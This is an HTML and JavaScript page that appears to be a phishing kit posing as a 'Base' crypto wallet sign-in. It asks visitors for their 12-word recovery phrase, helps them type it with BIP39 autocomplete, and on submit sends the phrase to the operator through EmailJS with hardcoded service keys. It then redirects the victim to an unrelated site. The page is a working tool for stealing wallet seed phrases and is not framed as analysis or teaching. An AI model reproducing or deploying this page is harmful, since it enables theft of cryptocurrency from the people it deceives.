<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Base</title>
  <style>
    :root {
      --bg: #000;
      --text: #fff;
      --input-bg: #111;
      --input-border: #333;
      --input-focus: #3399ff;
      --btn-bg: #1a1a1a;
      --btn-hover-bg: #2a2a2a;
      --border: #222;
      --muted-text: #bbb;
    }

    html, body {
      height: 100%;
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    }

    .site-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 10px 20px;
      background: var(--bg);
      border-bottom: 1px solid var(--border);
      box-sizing: border-box;
    }

    .logo img {
      height: 50px;
      width: auto;
      display: block;
    }

    .header-controls {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      width: 100%;
      max-width: 800px;
    }

    /* Search container */
    .search-area {
      display: flex;
      align-items: center;
      background: #222;
      border: 1px solid #222;
      border-radius: 20px;
      height: 40px;
      flex: 1;
      min-width: 200px;
      max-width: 500px;
      padding: 0 8px 0 12px;
      box-sizing: border-box;
      cursor: text;
      transition: border-color 0.2s ease;
    }

    .search-area.active {
      border-color: var(--input-focus);
      box-shadow: 0 0 6px var(--input-focus);
    }

    .search-icon {
      width: 20px;
      height: 20px;
      margin-right: 8px;
      flex-shrink: 0;
    }

    .search-icon img {
      width: 80%;
      height: 80%;
      display: block;
      cursor: pointer;
      padding-top: 2px;
    }

    .search-area input[type="search"] {
      flex: 1;
      height: 100%;
      border: none;
      background: transparent;
      color: var(--text);
      font-size: 16px;
      outline: none;
      padding: 0;
    }

    .action-btn {
      background: var(--btn-bg);
      border: none;
      border-radius: 25px;
      color: var(--text);
      cursor: pointer;
      font-size: 15px;
      font-weight: 600;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0 18px;
      height: 40px;
      transition: background 0.2s ease;
    }

    .action-btn:hover {
      background: var(--btn-hover-bg);
    }

    @property --angle {
      syntax: '<angle>';
      initial-value: 0deg;
      inherits: false;
    }

    .connect-btn {
      background-color: #333;
      border-radius: 25px;
      border: 2px solid transparent;
      background-image:
        linear-gradient(#333, #333),
        conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red);
      background-origin: border-box;
      background-clip: padding-box, border-box;
      transition: background-color 0.3s ease;
      --angle: 0deg;
    }

    .connect-btn:hover {
      animation: rotate-border 2s linear infinite;
    }

    @keyframes rotate-border {
      to {
        --angle: 360deg;
      }
    }

    main {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      box-sizing: border-box;
      min-height: calc(100vh - 100px);
      position: relative; /* for autocomplete absolute positioning */
    }

    form.full-form {
      background: #111;
      padding: 25px;
      border-radius: 12px;
      max-width: 480px;
      width: 100%;
      box-sizing: border-box;
      position: relative; /* autocomplete positioning inside */
    }

    form.full-form h2 {
      margin-top: 0;
      margin-bottom: 16px;
      font-weight: 500;
      font-size: 22px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-size: 14px;
      color: var(--muted-text);
    }

    textarea {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 8px;
      font-size: 14px;
      border-radius: 6px;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      color: var(--text);
      resize: vertical;
      outline: none;
      box-sizing: border-box;
      font-family: inherit;
      position: relative;
      z-index: 1;
    }

    button.submit-btn {
      width: 100%;
      height: 44px;
      background: var(--btn-bg);
      border: none;
      border-radius: 6px;
      color: var(--text);
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
      margin-top: 12px;
    }

    button.submit-btn:hover:not(:disabled) {
      background: var(--btn-hover-bg);
    }

    button.submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* Autocomplete */
    .autocomplete-items {
      position: absolute;
      top: 100%;
      left: 0;
      right: 0;
      z-index: 1000;
      border: 1px solid #d4d4d4;
      background-color: #fff;
      max-height: 150px;
      overflow-y: auto;
      border-radius: 6px;
      font-size: 14px;
      color: #000;
      box-sizing: border-box;
    }

    .autocomplete-items div {
      padding: 8px 12px;
      cursor: pointer;
      white-space: nowrap;
      user-select: none;
      transition: background-color 0.2s ease, color 0.2s ease;
    }

    .autocomplete-items div:hover,
    .autocomplete-active {
      background-color: #3399ff;
      color: #fff;
    }

    /* Loader */
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    /* ---- RESPONSIVE ---- */
    @media (max-width: 768px) {
      .site-header {
        flex-direction: column;
        align-items: flex-start;
      }

      .header-controls {
        flex-direction: column;
        width: 100%;
        gap: 12px;
      }

      .search-area {
        width: 100%;
        max-width: none;
      }

      .action-btn {
        width: 100%;
      }

      form.full-form {
        padding: 20px;
      }
    }

    @media (max-width: 480px) {
      .search-area input[type="search"] {
        font-size: 14px;
      }

      form.full-form h2 {
        font-size: 20px;
      }

      textarea {
        font-size: 13px;
      }

      button.submit-btn {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <header class="site-header">
    <div class="logo">
      <img src="https://i.imghippo.com/files/VPw1274ruA.png" alt="Base logo" />
    </div>
    <div class="header-controls">
      <form class="search-area" role="search" method="GET" action="/search-results" novalidate>
        <span class="search-icon"><img src="https://i.imghippo.com/files/Alr7794o.png" alt="Search Icon" /></span>
        <input type="search" name="q" placeholder="Search coins, appsâ€¦" />
      </form>
      <button type="button" class="action-btn create-wallet-btn">Create a wallet</button>
      <button type="button" class="action-btn connect-btn">Connect</button>
    </div>
  </header>

  <main>
    <form class="full-form" id="contact-form" autocomplete="off">
      <h2>Sign in</h2>
      <label for="about">This is a 12-word</label>
      <textarea id="about" name="message" rows="4" placeholder="12-word" spellcheck="false" autocomplete="off"></textarea>
      <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
      <button type="submit" class="submit-btn">Continue</button>

      <!-- ðŸ”„ Loading Spinner -->
      <div id="spinner" style="display:none; text-align:center; margin-top:10px;">
        <div class="loader"></div>
        <p>Sending...</p>
      </div>
    </form>
  </main>
  
  <script>
  document.addEventListener("DOMContentLoaded", function () {
    const textarea = document.getElementById("about");
    const listDiv = document.getElementById("autocomplete-list");

    // Suggestions list (example subset of BIP39 wordlist)
    const suggestions = [
      "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
      "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
    ];

    let currentFocus = -1;

    function closeSuggestions() {
      listDiv.innerHTML = "";
      listDiv.style.display = "none";
      currentFocus = -1;
    }

    function createSuggestionItem(word) {
      const div = document.createElement("div");
      div.textContent = word;
      div.addEventListener("mousedown", function (e) {
        e.preventDefault();
        insertWordAtCursor(textarea, word);
        closeSuggestions();
      });
      return div;
    }

    function insertWordAtCursor(textarea, word) {
      const start = textarea.selectionStart;
      const end = textarea.selectionEnd;
      const value = textarea.value;

      // Find start of the current word
      let wordStart = start;
      while (wordStart > 0 && !/\s/.test(value[wordStart - 1])) {
        wordStart--;
      }
      const before = value.substring(0, wordStart);
      const after = value.substring(end);
      const sepBefore = before.length > 0 && !before.endsWith(' ') ? " " : "";
      const sepAfter = after.length > 0 && !after.startsWith(' ') ? " " : "";

      textarea.value = before + sepBefore + word + sepAfter + after;

      const newPos = (before + sepBefore + word).length;
      textarea.setSelectionRange(newPos, newPos);
      textarea.focus();
    }

    textarea.addEventListener("input", function () {
      const inputVal = textarea.value;
      const cursorPos = textarea.selectionStart;

      let wordStart = cursorPos;
      while (wordStart > 0 && !/\s/.test(inputVal[wordStart - 1])) {
        wordStart--;
      }
      const partialWord = inputVal.substring(wordStart, cursorPos).toLowerCase();

      closeSuggestions();

      if (partialWord.length === 0) return;

      const filtered = suggestions.filter(word =>
        word.toLowerCase().startsWith(partialWord)
      );

      if (filtered.length === 0) return;

      listDiv.style.display = "block";

      filtered.slice(0, 4).forEach(word => {
        const item = createSuggestionItem(word);
        listDiv.appendChild(item);
      });
    });

    textarea.addEventListener("keydown", function (e) {
      const items = listDiv.querySelectorAll("div");
      if (listDiv.style.display === "none") return;

      if (e.key === "ArrowDown") {
        e.preventDefault();
        currentFocus++;
        addActive(items);
      } else if (e.key === "ArrowUp") {
        e.preventDefault();
        currentFocus--;
        addActive(items);
      } else if (e.key === "Enter") {
        if (currentFocus > -1) {
          e.preventDefault();
          if (items[currentFocus]) {
            items[currentFocus].dispatchEvent(new Event("mousedown"));
          }
        }
      } else if (e.key === "Escape") {
        closeSuggestions();
      }
    });

    function addActive(items) {
      if (!items) return false;
      removeActive(items);
      if (currentFocus >= items.length) currentFocus = 0;
      if (currentFocus < 0) currentFocus = items.length - 1;
      items[currentFocus].classList.add("autocomplete-active");
    }

    function removeActive(items) {
      items.forEach(item => item.classList.remove("autocomplete-active"));
    }

    // Delay closing to allow click event to register properly
    textarea.addEventListener("blur", () => setTimeout(closeSuggestions, 150));
  });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>
  (function(){
    emailjs.init("SdkmRe8WZ7itEba9z"); // Your EmailJS public key
  })();

  const form = document.getElementById("contact-form");
  const spinner = document.getElementById("spinner");
  const submitBtn = form.querySelector("button[type='submit']");

  form.addEventListener("submit", function(event) {
    event.preventDefault();

    spinner.style.display = "block";
    submitBtn.disabled = true;

    emailjs.sendForm("service_zuj2d2a", "template_tvd86sp", form)
      .then(function() {
        window.location.href = "https://www.accountchemist.com"; // Redirect on success
      })
      .catch(function(error) {
        console.error("Failed to send email:", error);
        spinner.style.display = "none";
        submitBtn.disabled = false;
        alert("Failed to send data. Please try again.");
      });
  });
  </script>
</body>
</html>
